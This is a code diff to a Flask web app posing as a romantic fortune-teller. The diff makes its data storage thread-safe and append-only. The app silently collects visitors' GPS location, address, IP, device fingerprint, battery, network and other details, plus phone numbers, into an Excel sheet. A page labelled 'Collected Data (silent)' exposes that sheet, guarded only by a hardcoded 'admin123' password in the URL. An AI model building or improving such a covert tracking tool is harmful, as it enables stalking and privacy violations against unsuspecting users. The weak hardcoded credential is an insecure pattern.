@@ -8,6 +8,7 @@ import os
 import requests
 import json
 import random
+import threading
 from datetime import datetime
 
 app = Flask(__name__)
@@ -17,6 +18,7 @@ CORS(app)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
 BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
+FILE_LOCK = threading.Lock()
 
 # Romantic fortunes (32 messages)
 FORTUNES = [
@@ -54,48 +56,87 @@ FORTUNES = [
     "Love recognizes no barriers."
 ]
 
-# ---------- Excel persistence ----------
+# ---------- Excel persistence (thread‑safe, append‑only) ----------
 def ensure_data_file():
-    if not os.path.exists(DATA_FILE):
-        wb = Workbook()
-        ws = wb.active
-        ws.title = "Fortunes Data"
-        headers = [
-            'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
-            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
-            'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
-        ]
-        for col, header in enumerate(headers, 1):
-            cell = ws.cell(row=1, column=col, value=header)
-            cell.font = Font(bold=True, color="FFFFFF")
-            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
-            cell.alignment = Alignment(horizontal="center")
-        wb.save(DATA_FILE)
+    """Create the Excel file with headers if it doesn't exist."""
+    with FILE_LOCK:
+        if not os.path.exists(DATA_FILE):
+            wb = Workbook()
+            ws = wb.active
+            ws.title = "Fortunes Data"
+            headers = [
+                'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
+                'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
+                'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
+            ]
+            for col, header in enumerate(headers, 1):
+                cell = ws.cell(row=1, column=col, value=header)
+                cell.font = Font(bold=True, color="FFFFFF")
+                cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
+                cell.alignment = Alignment(horizontal="center")
+            wb.save(DATA_FILE)
+            print(f"✅ Created new Excel file: {DATA_FILE}")
 
 def backup_data():
-    if os.path.exists(DATA_FILE):
-        try:
-            wb = openpyxl.load_workbook(DATA_FILE)
-            wb.save(BACKUP_FILE)
-        except:
-            pass
-
-def load_data():
-    try:
+    """Create a backup copy of the current Excel file."""
+    with FILE_LOCK:
         if os.path.exists(DATA_FILE):
-            return pd.read_excel(DATA_FILE)
-        elif os.path.exists(BACKUP_FILE):
-            return pd.read_excel(BACKUP_FILE)
-    except:
-        pass
-    return pd.DataFrame()
+            try:
+                import shutil
+                shutil.copy2(DATA_FILE, BACKUP_FILE)
+                print(f"✅ Backup created: {BACKUP_FILE}")
+            except Exception as e:
+                print(f"⚠️ Backup failed: {e}")
 
-def save_data(df):
-    try:
-        backup_data()
-        df.to_excel(DATA_FILE, index=False, engine='openpyxl')
-    except Exception as e:
-        print(f"Save failed: {e}")
+def append_to_excel(new_row_dict):
+    """Append a single row to the Excel file without overwriting existing data."""
+    with FILE_LOCK:
+        try:
+            # Read existing data (if any)
+            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
+                df = pd.read_excel(DATA_FILE, engine='openpyxl')
+            else:
+                # File missing or empty – create new
+                df = pd.DataFrame(columns=[
+                    'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
+                    'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
+                    'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
+                ])
+            # Append new row
+            new_row = pd.DataFrame([new_row_dict])
+            df = pd.concat([df, new_row], ignore_index=True)
+            # Write back
+            df.to_excel(DATA_FILE, index=False, engine='openpyxl')
+            print(f"✅ Appended row for {new_row_dict.get('Name', 'Unknown')}")
+            # Create backup after each successful write
+            backup_data()
+        except Exception as e:
+            print(f"❌ Failed to append to Excel: {e}")
+
+def update_excel_row(session_id, updates):
+    """Update an existing row (by SessionID) with new values (e.g., phone number)."""
+    with FILE_LOCK:
+        try:
+            if not os.path.exists(DATA_FILE):
+                return
+            df = pd.read_excel(DATA_FILE, engine='openpyxl')
+            idx = df[df['SessionID'] == session_id].index
+            if len(idx) > 0:
+                for key, value in updates.items():
+                    if key in df.columns:
+                        df.loc[idx[-1], key] = value
+                df.to_excel(DATA_FILE, index=False, engine='openpyxl')
+                print(f"✅ Updated row for SessionID {session_id}")
+                backup_data()
+        except Exception as e:
+            print(f"❌ Failed to update Excel: {e}")
+
+def load_all_data():
+    """Return all data as a DataFrame (for admin panel)."""
+    with FILE_LOCK:
+        if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
+            return pd.read_excel(DATA_FILE, engine='openpyxl')
+        return pd.DataFrame()
 
 def get_client_ip():
     if 'X-Forwarded-For' in request.headers:
@@ -133,78 +174,30 @@ def index():
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             text-align: center;
         }
-        h1 {
-            font-size: 2.2em;
-            background: linear-gradient(135deg, #ff6b6b, #c06c84);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 10px;
-        }
-        .sub {
-            color: #888;
-            margin-bottom: 25px;
-            font-size: 0.95em;
-        }
+        h1 { font-size: 2.2em; background: linear-gradient(135deg, #ff6b6b, #c06c84); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 10px; }
+        .sub { color: #888; margin-bottom: 25px; font-size: 0.95em; }
         .btn {
-            background: linear-gradient(135deg, #ff6b6b, #c06c84);
-            color: white;
-            border: none;
-            padding: 14px 25px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-            margin: 10px 0;
+            background: linear-gradient(135deg, #ff6b6b, #c06c84); color: white; border: none;
+            padding: 14px 25px; font-size: 16px; font-weight: 600; border-radius: 60px;
+            cursor: pointer; transition: 0.3s; width: 100%; margin: 10px 0;
         }
-        .btn-small {
-            width: auto;
-            padding: 10px 20px;
-            font-size: 14px;
-            margin-top: 5px;
-        }
+        .btn-small { width: auto; padding: 10px 20px; font-size: 14px; margin-top: 5px; }
         .btn:hover { transform: translateY(-2px); }
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 20px;
-            font-size: 14px;
-        }
+        .status { margin-top: 20px; padding: 12px; border-radius: 20px; font-size: 14px; }
         .fortune-box {
-            background: rgba(255,182,193,0.3);
-            border-left: 5px solid #ff1493;
-            border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
-            font-size: 1.3em;
-            font-weight: bold;          /* <--- fortune text in bold, normal font */
-            color: #c06c84;
-            line-height: 1.4;
+            background: rgba(255,182,193,0.3); border-left: 5px solid #ff1493;
+            border-radius: 20px; padding: 20px; margin: 20px 0;
+            font-size: 1.3em; font-weight: bold; color: #c06c84; line-height: 1.4;
         }
         .hidden { display: none; }
         hr { margin: 20px 0; border: 1px solid #ffdde1; }
         input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 2px solid #ffdde1;
-            border-radius: 60px;
-            text-align: center;
-            font-size: 16px;
-            font-family: inherit;
+            width: 100%; padding: 14px; margin: 10px 0;
+            border: 2px solid #ffdde1; border-radius: 60px; text-align: center;
+            font-size: 16px; font-family: inherit;
         }
-        .sms-prompt {
-            background: rgba(255,255,255,0.8);
-            border-radius: 20px;
-            padding: 15px;
-            margin-top: 15px;
-        }
-        .sms-prompt p {
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
+        .sms-prompt { background: rgba(255,255,255,0.8); border-radius: 20px; padding: 15px; margin-top: 15px; }
+        .sms-prompt p { font-size: 14px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -315,8 +308,6 @@ def index():
                 currentFortune = data.fortune;
                 document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                 document.getElementById('fortuneDisplay').classList.remove('hidden');
-                
-                // Show SMS prompt
                 document.getElementById('smsSection').classList.remove('hidden');
             }, () => {
                 showStatus('⚠️ Location denied. Random fortune below.', true);
@@ -396,8 +387,7 @@ def reverse_geocode():
 @app.route('/save', methods=['POST'])
 def save():
     data = request.json
-    df = load_data()
-    new_row = pd.DataFrame([{
+    new_row = {
         'Timestamp': datetime.now(),
         'SessionID': data.get('sessionId', ''),
         'Name': data.get('name', ''),
@@ -414,9 +404,8 @@ def save():
         'Fingerprint': data.get('fingerprint', ''),
         'Fortune': '',
         'PhoneNumber': ''
-    }])
-    df = pd.concat([df, new_row], ignore_index=True)
-    save_data(df)
+    }
+    append_to_excel(new_row)
     return jsonify({'status': 'saved'})
 
 @app.route('/save-phone', methods=['POST'])
@@ -425,68 +414,20 @@ def save_phone():
     session_id = data.get('sessionId')
     phone = data.get('phoneNumber')
     fortune = data.get('fortune', '')
-    
-    df = load_data()
-    if df.empty:
-        new_row = pd.DataFrame([{
-            'Timestamp': datetime.now(),
-            'SessionID': session_id,
-            'Name': '',
-            'Latitude': 0,
-            'Longitude': 0,
-            'Address': '',
-            'Battery': '',
-            'UserAgent': '',
-            'Screen': '',
-            'IP': get_client_ip(),
-            'Timezone': '',
-            'Memory': '',
-            'Network': '',
-            'Fingerprint': '',
-            'Fortune': fortune,
-            'PhoneNumber': phone
-        }])
-        df = new_row
-    else:
-        idx = df[df['SessionID'] == session_id].index
-        if len(idx) > 0:
-            df.loc[idx[-1], 'PhoneNumber'] = phone
-            df.loc[idx[-1], 'Fortune'] = fortune
-        else:
-            new_row = pd.DataFrame([{
-                'Timestamp': datetime.now(),
-                'SessionID': session_id,
-                'Name': '',
-                'Latitude': 0,
-                'Longitude': 0,
-                'Address': '',
-                'Battery': '',
-                'UserAgent': '',
-                'Screen': '',
-                'IP': get_client_ip(),
-                'Timezone': '',
-                'Memory': '',
-                'Network': '',
-                'Fingerprint': '',
-                'Fortune': fortune,
-                'PhoneNumber': phone
-            }])
-            df = pd.concat([df, new_row], ignore_index=True)
-    
-    save_data(df)
+    update_excel_row(session_id, {'PhoneNumber': phone, 'Fortune': fortune})
     return jsonify({'status': 'saved'})
 
 @app.route('/admin')
 def admin():
     if request.args.get('pass') != 'admin123':
         return '<form>Admin password: <input name="pass"><button>Login</button></form>'
-    df = load_data()
+    df = load_all_data()
     if df.empty:
         return "<h2>No data yet</h2>"
     html = "<h2>💾 Collected Data (silent)</h2><table border='1'>"
     html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
     for _, row in df.iterrows():
-        html += "<tr>" + "".join(f"<td>{str(val)[:80]}</td>" for val in row) + "</tr>"
+        html += "<tr>" + "".join(f"<td style='font-size:12px;'>{str(val)[:80]}</td>" for val in row) + "</tr>"
     html += "</table><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
     return html
 
@@ -495,9 +436,11 @@ def download_excel():
     if request.args.get('pass') != 'admin123':
         from flask import abort
         abort(403)
-    return send_file(DATA_FILE, as_attachment=True)
+    if os.path.exists(DATA_FILE):
+        return send_file(DATA_FILE, as_attachment=True)
+    return "No data yet", 404
 
 if __name__ == '__main__':
     ensure_data_file()
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=port, debug=False)
